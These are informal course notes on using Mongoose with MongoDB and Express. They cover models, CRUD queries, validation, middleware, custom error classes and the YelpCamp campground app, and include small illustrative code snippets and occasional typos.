~> for Node.js, we can npm i the required driver to connect Node to Mongo

- however, we will use the tool "MONGOOSE!"

- ODM: Object Data Maper?
: Object Document Mapper?
: ODMs like Mongoose map documents coming from a database into usable JavaScript objects
: Mongoose provides ways for us to model out our application data and define a schema. It offers easy ways to validate data and build complex queries from the comfort of JS.

~> so it is more than just a driver, which provides an extra layer of validation + others on top of connecting Mongo and JavaScript
~> translate database information to programming language objects

- cf. ORM: Object Relation Mapper ~> used for SQL-based ODMs

<br>

#### 379. Connecting Mongoose to Mongo
- ALWAYS a good idea to have "mongoosejs.com" open while working with it! as syntax can be complex

- we will first use Mongoose separately, then migrate over to incorporating Express, and other web-related stuffs!!

- in MongooseBasics folder,
  ex. npm init -y
  ex. npm i mongoose
  ex. touch index.js
  
- in index.js,
  ex. const mongoose = require('mongoose')
  ex. mongoose.connect('mongodb://localhost:27017/test', {useNewUrlParser: true, useUnifiedTopology: true});

- our first goal is to get Mongoose
  : then connect to our Mongo DB Server!
  : default MongoDB Port - 27017 (can be found in Mongo DB docs!)

- docs -> Quick Start -> the following lines are recommended to be included!
  : to make sure that we successfully connected!
  : const db = mongoose.connection;
    db.on('error', console.error.bind(console, 'connection error:'));
    db.once('open', function() {
    // we're connected!
    });

- NOTE: .connect() method returns PROMISE and for error handling, using "CATCH" is a good idea!

- ex. mongoose.connect(...)
      .then(() => {
          console.log("CONNECTION OPEN!!")
      })
      .catch(err => {
          console.log("ERROR!!")
          console.log(err)
      })

<br>

#### 380. Our First Mongoose Model
- The Models are JS classes that we make with the assistance of Mongoose, which represent the data in MongoDB

- it helps us interact with the database

- for every single resource or collection we are planning to use in a JS file through Mongoose, we shou900ld define a model for each one

- With Mongoose, everything is derived from Schema.

- Scheme: schematic / blueprint / gameplan
: mapping of different collection keys from Mongo to different types in JS

ex. var blogSchema = new mongoose.Schema({
        title: String,
        author: String,
        body: String,
        comments: [{body: String, data: Date}],
        date: {type: Date, default: Date.now},
        hidden: Boolean,
        meta: {
          votes: Number,
          favs: Number
        }
    });

ex. const Movie = mongoose.model('Movie', movieSchema)
~> here, 'Movie' is the model name!
~> it has to be singular and start with an uppercase letter
~> Mongoose will take that and make a collection called 'movies'

~> now we have a model class named Movie!

~> now we can make instances of Movie classes and save them on MongoDB

ex. const amadeus = new Movie({title: 'Amadeus', year: 1986, score: 9.2, rating: 'R'})

- In Git Bash,
  ex. node
  ex. .load index.js
  ex. amadeus

- and if want to save it,
  ex. amadeus.save() //.save()comes with every Model

- in mongo,
  ex. use movieApp
  ex. db.movies.find()

- ex. amadeus.score = 9.7 //changing on JS
  ex. amadeus.save() //now saved on MongoDB as well!

<br>

#### 381. Insert Many
- Commonly used way
: ex. const blah = new Movie()
  ex. blah.save()
  => you need to call .save()

- Not that common to insert multiple resources at the same time but here's how
: ex. Movie.insertMany([
        {title: 'blah', rating: 'R'},
        {title: 'blah', rating: 'R'},
        {title: 'blah', rating: 'R'}
      ])

=> no need to .save() later

- .insertMany() returns a Promise!! so can do .then and .catch

: Movie.insertMany(...)
  .then(data => {
        console.log("IT WORKED!");
        console.log(data);
  })

<br>

#### 382. Finding with Mongoose
- Model.find()
  Model.findById()
  ...

- same as finding in mongo
: pass in queries
: the same operators (ex. $gt)

- NOTE. FINDING SOMETHING IN MONGO CAN BE PAINFUL
: HOW DO WE KNOW THAT THE COMMAND WENT THROUGH WHILE WAITING?

1. Use Callbacks (NOT recommended)
: ex. MyModel.find({name: 'John', age: {$gt: 18}}, function (err, docs)());

2. Treat the results like promises
: though MONGOOSE QUERIES are NOT PROMISES

- ex. node
  ex. .load index.js
  ex. Movie ~>Model{Movie}
  ex. Movie.find({}).then(data => console.log(data))
  => these are the DATA we can use!! (without this, the returned ones are QUERIES)

  => it's an **array** containing movies from MongoDB
  
  ex. Movie.find({rating: 'PG-13'}),then(data => console.log(data))

  ex. Movie.findOne({}).then(m => console.log(m))
  ~> first movie as an element in an array

- .exec() method
  => gives us a full PROMISE (not QUERY, the thenable object)

- .findById(id) ~>very commonly used! Especially in an Express app
  ex. app.get('movies/:id') and just can use that id to find the matching data in the database

<br>

#### 383. Updating With Mongoose
- ex. Model.updateMany()
  ex. Model.updateOne()
  
- ex. in mongo,
  ex. db.movies.find({title: 'Amadeus'})

- ex. in node,
  ex. Movie.updateOne({title: 'Amadeus'}, {year: 1984} ).then(res => console.log(res))
  // change the year of the movie 'Amadeus'

- ex. in mongo,
  ex. db.movies.find({title: {$in: ['Amadeus', 'blah']}})

- ex. in node,
  ex. Movie.updateMany({title: {$in:['Amadeus', 'blah' ]}}, {score: 10.0}).then(res => console.log(res))

- ex. Model.findOneAndUpdate()
  ~> finds the object and update and gives us back the original object! (but with {new: true}, it returns the updated one)

  ex. Movie.findOneAndUpdate({title: 'blah'}, {score: 7.00}, {new: true}).then(m => consoel.log(m))

- ALWAYS be careful of DEPRECATION warnings!
: Solutions - https://mongoosejs.com/docs/deprecations.html

<br>

#### 384. Deleting With Mongoose!
- ex. .remove() ~> does not give us back any documents that were invovled 

- but
  ex. .findOneAndRemove() and
  ex. .findByIdAndRemove()
  give back the object ~> depends on the use!

- in node,
  ex. Movie.remove({title: 'blah'}).then(msg => console.log(msg))
  ex. Movie.deleteMany({year: {$gte: 1999}}).then(msg => console.log(msg))
  ex. Model.findOneAndDelete({title: 'blah'}).then(m => console.log (m))

<br>

#### 385. Mongoose Schema Validations
- Let's talk more about creating Mongo Schema!

- let's make a new model
  ex. touch product.js

- **OPERATION BUFFERING**
: allows us to use the models we defined IMMEDIATELY
  (without having to wait for Mongoose to be conencted)
  ~> we don't need to nest all the codes in mongoose.connect().then()

- ex. const productSchema = new mongoose.Schema({
        //name: String,
        name: {
            type: String
            required: true
        }
        price: {
            type: Number
        }
      })

- ex. const Product = mongoose.model('Product', productSchema)

- ex. const mountainbike = new Product({name: 'Mountain Bike', price: 599})
      // if name is not specified error is returned
- ex. mountainbike.save()
    .then(data => {
        console.log("IT WORKED!");
        console.log(data);
    })
    .catch(err => {
        console.log("ERROR!")
        console.log(err)
    })

- if you pass in data that is not defined in the schema, the code still runs but does not store that additional information!!

<br>

#### 386. Additional Schema Constraints
- schema type options
: https://mongoosejs.com/docs/schematypes.html

<br>

#### 387. Validating Mongoose Updates
- when you are UPDATE-ing database, you have to SPECIFICALLY TELL if you still want to apply VALIDATIONS
: under options, runValidators: true  

<br>

#### 388. Mongoose Validation Errors
- built-in validators ex. min, max
  : min: [6, 'Too few eggs']
  ~> the second value is the errormessage!

- there are a lot of error handling packages out there too!

- and commonly, validation can occur on the client side even before the server attempts to save it 

<br>

#### 389. Model Instance Methods
- Adding our own functions to the schema
: very common!
: a way of adding functions to the Model, in addition to whatever Mongoose is already providing.

- Instance Methods
: methods available on every single instance

- vs. Static / Class Methods
: all of the methods that start with a class

ex. const Proudct = mongoose.model('Product', productSchema)
ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!

- Let's start by defining our own instance method
  ex. ~Schema.methods.~whateveryouwant
  ex. productSchema.methods.greet = function() {
          console.log("HELLO!!!")
      }
      => make sure that these are added BEFORE mongoose.model line!

- in node,
  ex. node
  ex. .load product.js,
  ex. const p = new Product({name: 'bike bag', price:10})
  ex. p.greet()

- ex. const findProduct = async() => {
        const foundProduct = await Product.findOne({name: 'Bike Helmet'})
        foundProudct.greet();
      }
  ex. findProduct()

- another function example
:  ex. const findProduct = async () => {
            const foundProduct = await Product.findOne({name: 'Mountain Bike'});
            foundProduct.onSale = !foundProduct.onSale
            foundProduct.save()
        }
        // toggle the onSale property

: ex. productSchema.methods.toggleOnSale = function () {
          this.onSale = !this.onSale;
          return this.save()
      }
  ex. const findProduct = async() => {
            const foundProduct = await Product.findOne(...)
            console.log(foundProduct)
            await foundProduct.toggleOnSale();
            console.log(foundProduct); 
      }

- productSchema.methods.addCategory = function (newCat) {
    this.categories.push(newCat);
    return this.save()
}

- one of the points of having methods / functions
: to do the same thing repeatedly

<br>

#### 390. Adding Model Static Methods
- not applicable to "instances"
- "this" means different thing

- static method  example!
  ex. productSchema.statics.fireSale = function(){
            return this.updateMany({},  {onSale: true, price: 5})
      }

- ex. Product.fireSale().then(res => console.log(res))

- **SO TO RE-ITERATE..!!**
: STATIC methods on the MODEL ~> often have to do with fancy ways of finding things, updating things, creating things, and deleting things
~> usually built on top of the existing Model methods incl. .find(), ...

: INSTANCE methods operate on individual instances of model, ex. addCategory and toggleOnSale for INDIVIDUAL product

<br>

#### 391. Mongoose Virtuals
- Mongoose virtuals give us ability to add features to the schema, which don't actually exist in the db itself, but we can access to via Mongoose

- person.js!

- ex. const personSchema = new mongoose.Schema({
        first: String,
        last: String
      })

  ex. personSchema.virtual('fullName').get(function() {
          return `${this.first} ${this.last}`

      })
      //getter of virtual property

  ex. const Person = mongoose.model('Person',personSchema)

- yes we can do this by using instance method like .getFullName(), but the virtual way will behave as if it's an actual property

- in node,
  ex. .load person.js
  ex. const tammy = new Person({first: 'Tammy', last: 'Chow'})
  ex. tammy.fullName ~> WORKS!!

  ex. tammy.save()!

- now in mongo,
  ex. use shopApp
  ex. show collections ~>  'people'also shown! + 'products'

- again, these virtuals ONLY exist in Mongoose side in JS, not available in db at all!

- we use if often when we use something commonly, which we could derive from what we have already

- Another thing - set! function (setter)
~> we can use this to UPDATE

- ex. personSchema.virtual('fullName').
        set(function (v) {
              this.name.first = v.substr(0,v.indexOf(' '));
              this.name.last = v.substr(v.indexOf(' ') +1);
        })

<br>

#### 392. Defining Mongoose Middleware
- this could easily be at least an hour of content
- mongoosejs.com/docs/middleware.html ~> Middleware (also called pre and post *hooks*) are functions which are passed control during execution of asynchronous functions. Middleware is specified on the schema level and is useful for writing plugins.

- Pre middleware functions are executed one after another, when each middleware calls next.
: ex. const schema = new Schema(...);
: ex. schema.pre('save',function(next){
        //do stuff
        next();
      });

- or can use a function which returns a Promise! in particular, can use Async/Await
- note that async functions automatically return Promise for us

: ex. personSchema.pre('save',async function(){
          console.log("ABOUT TO SAVE!!!")
      })
      personSchema.post('save',async function(){
          console.log("JUST SAVED!!!")
      })

- ex. const k = new Person({first: 'Kristen', last: 'Sun'})
  ex. k.save()
  ~> Promise {<pending>}
  ~> ABOUT TO SAVE!!!
  ~> JUST SAVED!!!

- could be useful if you wanna run something before or after a method
- for example, for a review model, you can reflect the new review to the average reviews using post  

<br>

## 38. Putting It All Together: Mongoose With Express
#### 393. What Matters In This Section
- Crucial
: Integrating Mongoose With Express
: Defining Our Model
: Products Index
: Product Details
: Creating Products
: Updating Products
: Deleting Products

- Nice To Have 
: Filtering By Category

<br>

#### 394. Express + Mongoose Basic Setup
- new empty folder!
- ex. npm init -y
  ex. npm i express ejs mongoose
  ex. touch index.js
  ex. mkdir views
  ex. nodemon index.js

~> note that MONGO D has to be running on the background!!

<br>

#### 395. Creating Our Model
- GOAL: to have the full CRUD application with user interface and so on, which is connected to MongoDB
~> Farm App!

- let's call the model Product (fruit / veggie / dairy)

- let's put all the MODELS in a separate folder!
~> no problem if all the logics are in index.js
~> but for typical applications, you will have many models

- (folder)model
  (file)product.js

- in product.js,
  ex. const mongoose = require ('mongoose');
  ex. const productSchema = new mongoose.Schema({})
  ex. const Proudct = mongoose.model('Product', productSchema)
  ex. module.exports = Product;

- let's make a file
  : **seeds.js**
  : to seed the database (give some initial data!)

- in seeds.js,
  : we require mongoose
  : we require Model
  : we connect to mongoose

  ~> web app / server / express not invovled!
  ~> this is the file we will run on its own anytime we want to get some new data in our database

- .insertMany ( )

- ex. node seeds.js

<br>

#### 396. Products Index
- Recall. RESTful convetion (just one pattern)recommended
  => '/products' 

- ex. app.get('/products', async (req, res) => {
          const products = await Product.find({})
          
          console.log(products)
          res.send('ALL PRODUCTS WILL BE HERE!')
      })
  => to make sure that codes are working!

<br>

#### 397. Product Details
- show.ejs

<br>

#### 398. Creating Products
- we need a form & a route to submit the form to
- the form
  : app.get('/products/new', (req, res) => {
        res.render('products/new')
    }) 
- the route
  : app.post('/products', async (req, res) => {
        const newProduct = new Product(req.body);
        await newProduct.save();
        res.redirect(`/products/${newProduct._id}`)
    })
- even when restarted, the newly added data are still  there!!!

<br>

#### 399. Updating Products
- app.get('/products/:id/edit', async (req, res) => {
        const product = await Product.findById(id)
        res.render('products/edit', {product})
})

- this time let's use PUT request (cuz we are changing everything! )

- ex. npm i method-override

- in index.js,
  ex. const methodOverride = require('method-override')
  ex. app.use(methodOverride('_method'))

- ex. Product.findByIdAndUpdate() ~> refer to the doc! (validation especially)

<br>

#### 400. Tangent On Category Selector
- Edit form to correctly show the category as the default option!

- add logic to each option...
  ex. <option ... <%= product.category === 'fruit' ? 'selected' : ''%>>
  => but this is tedious and has to manually add to every single option

- let's use loops instead.
  : in index.js,
    const categories = ['fruit', 'vegetable', 'dairy'];

    app.get('/products/new', (req, res) => {
        res.render('products/new', {categories});
    })

  : and then iterate over these categories and make an option for each one

<br>

#### 401. Deleeting Products
- app.delete('/products/:id, async (req, res) => {
      const {id} = req.params;
      const deletedProduct = await Product.findByIdAndDelete(id)

      res.redirect('/products');
  }

<br>

#### 402. BONUS: Filtering By Category
- how to construct urls?
: several options
: ex. /categories/dairy
  ex. /products?category=dairy => looks better!
  
- show.ejs

- index.js
  : app.get('/products', async (req, res) => {
        const {category} = req.query;
        if (category){
            const products = await Product.find({category});
            res.render('products/index', {products, category});
        }
        else {
            const products = await Product.find({});
            res.render('products/index', {products, category: 'All'})'
        }
    });

<br>

## 39. YelpCamp: Campgrounds CRUD
#### 403. Introducing YelpCamp: Our Massive Project
- https://github.com/Colt/YelpCamp/tree/c12b6ca9576b48b579bc304f701ebb71d6f9879a

<br>

#### 404. How To Access YelpCamp Code
- Resources & Codes for Each Section
- Github -  downlod or look ON it

<br>

#### 405. Creating the Basic Express App
- make a folder 'YelpCamp'
- ex. npm init -y ~> package.json created
  ex. npm i express mongoose ejs
  ex. touch app.js
- make views directory

<br>

#### 406. Campground Model Basics
- let's make a folder 'models'
- & 'campground .js' inside it

- ex. const mongoose =  require('mongoose');
  ex. const Schema = mongoose.Schema;

  ex. const CampgroundSchema = new Schema({
          title: String,
          price: String,
          description: String,
          location: String
      });
      module.exports = mongoose.model('Campground', CampgroundSchema);

- in app.js,
  ex. const mongoose = require('mongoose');
  ex. mongoose.connect('mongodb://localhost:27017/yelpcamp', { 
        //options to pass in!
        useNewUrlParser: true,
        useCreateIndex: true,
        useUnifiedTopology: true
      });
  ex. const db = mongoose.connection;
  ex. db.on(~~~)

-  in mongo,
  ex. use yelp-camp
  ex. db.campgrounds.find()
  ~> now can see the data

- On: In this case, if there is an error, the on callback would run which would result into printing the error in console

- Once: It is the callback to be executed when the given event is generated. In our case, the function will be called when the connection to mongodb is open i.e. the connection is successful.

<br>

#### 407. Seeding Campgrounds
- https://github.com/Colt/YelpCamp/blob/c12b6ca9576b48b579bc304f701ebb71d6f9879a/seeds/cities.js

- let's make some fake campgrounds to seed the database

- cities.js ~> info on web
- seedHelpers.js ~> set of descriptors and places
- these will be sources for fake campsites
=> move them to 'seeds'folder

- in the seeds folder, a separate index.js to make these self-contained!
~> don't need path and express
~> but we do need mongoose and campground in it

- we will run this file on its own, separately from the node app, anytime we want the seed database

- in index.js (seeds)
ex. const seedDB = async () => {
      await Campground.deleteMany({});//delete everything
      const c = new Campground({title: 'purple field'})
      await c.save();
    }

- ex. const sample = array => array[Math.floor(Math.random() * array.length)]
//to pick a random element from an array

- ex. const seedDB = async() => {
    await Campground.deleteMany({});//delete everything
    for (let i=0;i<50;i++){
        const random1000 = Math.floor(Math.random()*1000)+1
        const camp = new Campground({
            location: `${cities[random1000].city}, ${cities[random1000].state}`,
            title: `${sample(descriptors)} ${sample(places)}`
            //sample is a function so should invoke it with parens
        })
        await camp.save()
    }
}

- ex. seedDB().then(() => {
    //seedDB() returns promise because it's an async function
    
    mongoose.connection.close()
    //make sure to close the db connection once done 
})

<br>

#### 408. Campground Index
- let's get some basic CRUD functionality

- let's first set up different routes for campground index!

- in app.js,
  ex. app.get('/campgrounds', async (req, res) => {
        const campgrounds = await Campground.find({});
        res.render('campgrounds/index')
  })

- views>campgrounds>index.ejs
: to show all campgrounds!  

<br>

#### 409. Campground Show
- show.ejs
- in app.js,
ex. app.get ('/campgrounds/:id', async (req, res) => {
        const campground = await Campground.findById(req.params.id) 
        res.render('campgrounds/show', {campground})
    })

<br>

#### 410. Campground New & Create
- in app.js,
ex. app.get('/campgrounds/new', (req, res) => {
        res.render('campgrounds/new');
    })

- in new.ejs,
ex. <form action="/campgrounds" method = "POST">
      <div>
        <label for = ""></label>
        <input type = "text" id = "title" name = "campground[title]">

- here, campground[title] makes a group of entered items

- in app.js, the order of app.get() matters
: if we put app.get('/campgrounds/new',...) after app.get('/campgrounds/:id',...), "new" is treated as one of the "id's"

- now include
: app.post('/campgrounds'...) 

- but before that, we have to "parse" the req.body (we don't see anything now)
~> ex. app.use(express.urlencoded({extended: true}))

- ex. app.post('/campground', async (req, res) => {
        const campground = new Campground(req.body.campground);
        await campground.save();
        res.redirect(`/campgrounds /${campground._id}`)
      })

<br>

#### 411. Campground Edit & Update
- ex. app.get('/campgrounds/:id/edit',async (req, res) => {
        const campground = await Campground.findById(req.params.id);
        res.render('campgrounds/edit', {campground})
})

- edit.ejs

- use method-override!
ex. npm i method-override

- in app.js,
ex. app.use(methodOverride('_method' ))
ex. const methodOverride = require('method-override')
ex. app.put('/campgrounds/:id', async (req, res) => {
        const {id} = req.params;
        Campground.findByIdAndUpdate(id, {...req.body.campground})
})

<br>

#### 412. Campground Delete
- in app.js,
ex. app.delete('/campgrounds/:id',async(req,res)=>{
      const {id} = req.params;
      await Campground.findByIdAndDelete(id);
      res.redirect('/campgrounds');
})

- and need to make a form to send
: 'delete' request! [show.ejs]

<br>

## 40. Middleware: The Key to Express
#### 413. What Matters In This Section
- Crucial
: The concept of Middleware
: Defining Custom Middleware

- Nice To Have
: Morgan Logging Middleware

<br>

#### 414. Intro to EXPRESS Middleware!
- Express Middleware
: Express middleware are func's that run during the request / response  lifecycle.

- REQUEST -> MIDDLEWARE -> RESPONSE

- ex. to "parse" : .json
  ex. to server the static resourses like js and css: express-static

- So Middleware...
: are just functions
: each middleware has access to the request and response objects
: can end the HTTP request by sending back a response with methods like res.send()
: OR can be chained together, one after another by calling next()

- expressjs.com/en/guide/using-middleware.html
: Middleware functions are functions that have access to the
~> the request object (req)
~> the response object (res)
~> and the next middleware function in the app's request-response cycle

: middlware functions can perform the following
~> execute codes
~> make changes to the request and the response objects
~> end the request-response cycle
~> call the next middleware function in the stack

<br>

#### 415. Using Morgan - Logger Middleware
- https://github.com/expressjs/morgan

- an external middleware!
: HTTP request logger middleware for node.js
=> very useful when debugging stuff
=> lots of ppl like it when developing an app

- in Middleware_Intro folder...
ex. touch index.js
ex. npm i morgan express

- in order to use morgan,
ex. const morgan = require('morgan')

ex. app.use(morgan('tiny'))
=> then now you can see the log of requests on the console

ex. app.use(() => {})
~> app.use function can be called as middleware! it runs every single time on any type of HTTP request

~> for example, app.use(express.json()) runs on all requests to tell express to parse the body to json

- morgan ~> several options too! (Ex. to customize, etc.)

<br>

#### 416. Defining Our Own Middleware
- now let's define our very first simple middleware

- there are lots of situations where we want to make and use our own middlewares!

- https://expressjs.com/en/guide/writing-middleware.html

- ex. app.use((req, res, next) => {
          console.log('sth sth');
          next();
      })
: here, next() will execute whatever the next middleware is!(has to be there to have the following codes run)

: 'return next();' is also a nice and common convention

<br>

#### 417. More Middleware Practice
- morgan: just a logger
- and by having middlewares after that,
- we can access the requests and handle (take/add/edit) data
- BEFORE we reach the route handler

- ex. in middleware, we can see if the request has an authentication token to see if it's a valid request

- ex. "decorating" or "addding on" the request
~> ex. var requestTime = function (req, res, next) {
          req.requestTime = Date.now()
          next()
        });
   ex. app.get('/', function (req, res) {
            var response Text = `requested at ${req.requestTime}`
            res.send(responseText)
       });

- ex. app.use((req, res, next)=>{
          req.requestTime = Date.now() // --- (A)
          console.log(req.method.toUpperCase(), req.path);
          next();
      });
  ~> GET /dogs printed out
  ~> (A) now we have access to req.requestTime

- The order of the codes matters!!!

<br>

#### 418. Setting Up a 404 Route
- more on app.use and how we can use it!
- Express > Documentation > Application
- app.use() ~> mounts the specified middleware function or functions at the specified path: the middleware function is executed when the base of the requested path matches *path*.

- path can be basic or fancier with regular expressions

ex. app.use('/dogs', (req, res, next) => {
        console.log("I LOVE DOGS!!");
        next();
    });

- usually at end
ex. app.use((req, res) => {
        res.status(404).send('NOT FOUND')
    });

<br>

#### 419. Password Middleware Demo (NOT REAL AUTH)
- ex. app.use((req, res, next) => {
          const {password} = req.query;
          if (password === 'chickennugget'){
              next();
          }
          res.send('SORRY YOU NEED A PASSWORD!!')
      });

<br>

#### 420. Protecting Specific Routes!
- instead of using 'app.use', we can use 'app.get'!
- app.get()
~> can get multiple callbacks which can work like middlewares
ex. const verifyPassword = (req, res, next) => {
        const {password} = req.query;
        if (password === 'chickennugget'){
            next();
        }
        res.send('SORRY YOU NEED A PASSWORD!!')
    });
    
ex. app.get('/secret',verifyPassword, (req, res) => {
        res.send('MY SECRET IS: Sometimes I wear headphones in public so that I do not have to talk to anyone!')
    })

<br>

## 41. YelpCamp: Adding Basic Styles
#### 421. A New EJS Tool For Layouts
- https://github.com/JacksonTian/ejs-mate

- we will add some Bootstrap!!

- Package called 'ejs-mate'
~> allows us to add some fun functionalities to EJS
~> what we care about especially is: layout

- "layout" : is going to allow us to define some boilerplates where we can have code to insert in between some content

- in YelpCamp,ex. npm i ejs-mate

- then in app.js,
ex. const ejsMate = require ('ejs-mate');

ex. app.engine('ejs', ejsMate)
~> specifying that we will use ejsMate, instead of the default one, as the engine in order to handle ejs

- now we can define a layout file!

- in views directory,
ex. mkdir layouts

ex. touch layouts / boilerplate.ejs

- in boilerplate.ejs
: boilerplate
: <body>
    <h1>BEFORE</h1>
    <%- body %>
    <h1>AFTER</h1>
  </body>

- then in index.ejs,
ex. <% layout('layouts/boilerplate') %>
ex. then the bodycontent

<br>

#### 422. Bootstrap5! Boilerplate
- https://getbootstrap.com/

- Bootstrap 5!!!
~> the best thing: does not depend on jQuery anymore

- 'Migration'
: for more info on what's new for Bootstrap 5

- let's start by using CDN!
: CSS cdn at head (boilerplate.ejs)
: JS cdn at body

- let's style
~> <main class="container"> around the body

<br>

#### 423. Navbar Partial
- Let's add a very basic navbar to a boilerplate!
- navbar-dark bg-dark sticky-top
- views > partials
- <%- include('../partials/navbar')%>

<br>

#### 424. Footer Partial
- footer.ejs
ex. <footer class = "footer bg-dark  py-5">
      <div class="container">
          <span class="text-muted">&copy; YelpCamp</span>
      </div>
    </footer>

- let's make the footer to stay at the bottom, using FLEXBOX

~> <body class="d-flex flex-column vh-100">
// telling body to take the 100 view height (100)

~> <footer class="footer bg-dark py-3 mt-auto">

- here, 'mt-auto' used
: as we want to move only one item
: justify-content will move everything
: and there's no justify-self or sth
: so we use 'margin-auto' instead

<br>

#### 425. Adding Images
- let's re-seed all the campground sites with images!

- Unsplash Source API!!
~> source.unsplash.com

- update the model!
~> models > campground.js
~> const CampgroundSchema = new Schema({
      ...
      image: String,
      ...
   });

- seeds > index.js
<br>

#### 426. Styling Campgrounds Index
- bootstrap card!

- in views > index.ejs

ex. <div class =  "card mb-3">
      <div class = "row">
          <div class = "col-md-4">
            <img class = "img fluid" src = "<%=campground.image%>">
          </div>
      </div>
    </div>
  
- and more!

<br>

#### 427. Styling The New Form!
- using some components

<br>

#### 428. Styling The Edit Form!!

- same! added some styling

<br>

#### 429. Styling The Show Page!
- using cards component![kitchen sink]

<br>

## 42. Handling Errors In Express
#### 430. What Matters In This Section
- Crucial
: Defining Custom Error Handlers
: Handling Async Errors
: Defining Custom Error Class

- Important
: Express' Built-in Error Handler
: Working With Mongoose Errors

<br>

#### 431. Express' Built-in Error Handler!
- back to Middleware > index.js

- there are so many errors that could happen! (ex. API being down, validation not met, empty password and id, etc etc)
- also so many things that may not be in our control
- we want to anticipate and handle as many errors as possible

- even now (without adding any additional code) we get back the error message
~> in HTTP response format!
(all done automatically by Express)

- DEFAULT EXPRESS ERROR-HANDLING
~> expressjs.com/en/guide/error-handling.html

- also can do...
ex. const verifyPassword = (req, res, next) => {
        ...
        res.status(401)
        throw new Error('Password Required!)
    }

<br>

#### 432. Defining Own Custom Error Handlers!
- now let's move on from the built-in error handlers
- to custom error handlers!

- Error Handling Express Guide
~> Writing Error Handlers
~> Define error-handling middleware fn's in the same way except those have four arguments instead of three: (err, req, res, next)

- put the custom error handler at the END!
ex. app.use((err, req, res, next) => {
      console.log("**error!!");
      // next(); //--- (A)
      next(err); // --- (B)
})

- (A): calls the next middleware
  (B): calls the next error-handling middleware or the built-in

- like other middlewares, if we do not call next(), the code stops there

<br>

#### 433. Our Custom Error Class
- One of the strongly recommended practices with using Express, is that you define **custom error classes* to handle errors

~> because...
: when an error occurs, you wanna respond with a status code and some error messages

: to make things easier, rather than typing res.status and others every single time, let's make an error-handling class and use it

- new file
: AppError.js
ex. class AppError extends Error {
        //extends the built-in Error
        constructor(message, status){
            super();

            this.message = message;
            this.status = status;
        }
    }

    module.exports = AppError;

- in index.js,
ex. const AppError = require('./AppError')
ex. ... throw new AppError('password required!', 401)

- "Error Stack"
- ex. const {status = 500, message =  'something went wrong'} = err;
    res.status(status).send(message)

- note that there are lots of templates to make the error pages pretty!

- The built-in Error itself has a status code and msg
~> it is why we can deconstruct them

<br>

#### 434. Handling Async Errors
- Async_Errors
- ex. node seeds.js
  ex. node index.js

- same error handling AppError and app.use for the farmstand [product] project!
- there are tons of async functions! to await for database stuff and whatnot
~> but AppError acts differently for async functions!
~> in Express doc,
: "For errors returned from asynchronous functions invoked by route handlers and middleware, you must pass them to the next() function, where Express will catch and process them."
ex. app.get('/', function (req, res, next) {
          fs.readFile('/file-does-not-exist', function (err, data) {
              if(err){
                  next(err) // Pass errors to Express
              } else {
                res.send(data)
              }
          })
    })

- thus, pass AppError to next()!!
~> again,next() looks for the next middleware, and next(sth) looks for the next error-handling middleware

- ex. if(!product){
          return next(new  AppError('Product Not Found',404))
      }

  ~> 'return' it so that the rest of the codes do not run

<br>

#### 435. Handling More Async  Functions!
- there are other possible errors which are not thrown by us!
ex. no productname for 'new' ~> failing 'required' validation + error thrown by Mongoose!

~> we usually handle this kind of errors with TRY - CATCH!!

ex. app.post('/products', async (req, res, next) => {
    try{
        const newProduct = new Product(req.body);
        await newProduct.save();
        res.redirect(`/products/${newProduct._id}`)
    } catch (e) {
        next(e);
    }
})

~> handled Mongoose Errors!

- you gotta wrap everything inside try-catch whenever there are async functions which may possibly go wrong

- and using try-catch, we don't need to return new AppError to handle the errors thrown by us
: as those will be caught by catch (e) as well!

<br>

#### 436. Defining An Async Utility
- it's annoying to write try-catch for all the async functions, which happen a lot

- so define a function that we pass the entire callback to

- 1) remove try-catch
and 2) wrap the entire codes to another function (let. wrapAsync, catchAsync, etc.)

- ex. function wrapAsync(fn) {
          return function (req, res, next) {
                fn (req, res, next).catch(e =>  next(e))
          }
      }
  
  ~> here, fn (inside and outside) refers to the entire codes
  ~> 1) those codes are called as fn by Express
     2) it returns another function
     3) which will run those codes and catch the error if there's

- in Express 5, errors from async functions would be automatically treated Too!

<br>

#### 437. Differentiation of Mongoose Errors
- common thing: validation error!

- note: all mongoose errors have a property called name!

- let's add a new middleware which logs the name of the error
~> ex. app.use((err, req, res, next) => {
            console.log (err.name)
            next(err)
      })

~> ValidationError, CastError, And So On!

- so to handle specific errors with specific resonse,
ex. app.use((err, req, res,next) => {
        if (err.name ===  "ValidationError") err = handleVaidationError(err)
        next(err)
    }))

ex. const handleValidationError = err => {
        return new AppError ('Validation Error.. ' +  err.message,  400)
}

- a lot more to learn and apply, but this is the basic logic

<br>

## 43. YelpCamp: Errors & Validating Data
#### 438. Where to next with yelpcamp?
- client-side validation and error handler
- server-side validation

<br>

#### 439. Client-Side Form Validations
- can do 'required' using browser validation
~> but impletation is spotty, depending on the browser
~> does not give a clear reason why the form is not being submitted

- BootStrap > Validation
~> psuedo classes : valid & invalid

~> how it works?
: put "required" for all the inputs
: then put "novalidate" for form

: then we need to put some JS, which will prevent the users to submit the invalid form

: on Bootstrap website,
ex. // Example starter JavaScript for disabling form submissions if there are invalid fields
    (function () {
      'use strict'

      // Fetch all the forms we want to apply custom Bootstrap validation styles to
      var forms = document.querySelectorAll('.needs-validation')

      // Loop over them and prevent submission
      Array.from(forms) // converting forms to an Array!!
        .forEach(function (form) {
          form.addEventListener('submit', function (event) {
            if (!form.checkValidity()) {
              event.preventDefault()
              event.stopPropagation()
            }

            form.classList.add('was-validated')
          }, false)
        })
    })()

: select the forms based on the specific class
: loop over them and prevent submission

: to provide instant feedbacks - "valid-feedback" and "invalid-feedback" classes
ex. <div class="valid-feedback">Looks good! </div>
- let's move the JS to boilerplate for now, so that we can apply the validation to "EDIT" as well!

<br>

#### 440. Basic Error Handler
- Now, Price is set to be number, so if the input cannot be cast into a number, mongoose freaks out and the submission just keeps spinning
~> it's also async error (happening after express couldn't catch before the form submission reaches mongoose!)
~> gotta set up try-catch!
~> and
ex. app.use((err, req, res, next) => {
    res.send('Oh Boy, something went wrong!')
})

<br>

#### 441. Defining ExpressError  Classes!
- something we have done already, but adding to YelpCamp

- let's make another folder "utils"
~> error class
~> wrap async fn

- utils > ExpressError.js
ex. class ExpressError extends Error {
        constructor(message, status){
            super();

            this.message = message;
            this.status = status;
        }
    }
    module.exports = ExpressError

- utils > catchAsync.js

ex. module.exports = func => {
        return (req,res,next) => {
          func(req, res, next).catch(next)
        }
    }

- in app.js,
ex. const catchAsync = require ('./utils/catchAsync')

<br>

#### 442. More Errors
- ex. const ExpressError = require('./utils/ExpressError')

- ex. app.all('*', (req, res, next) => {
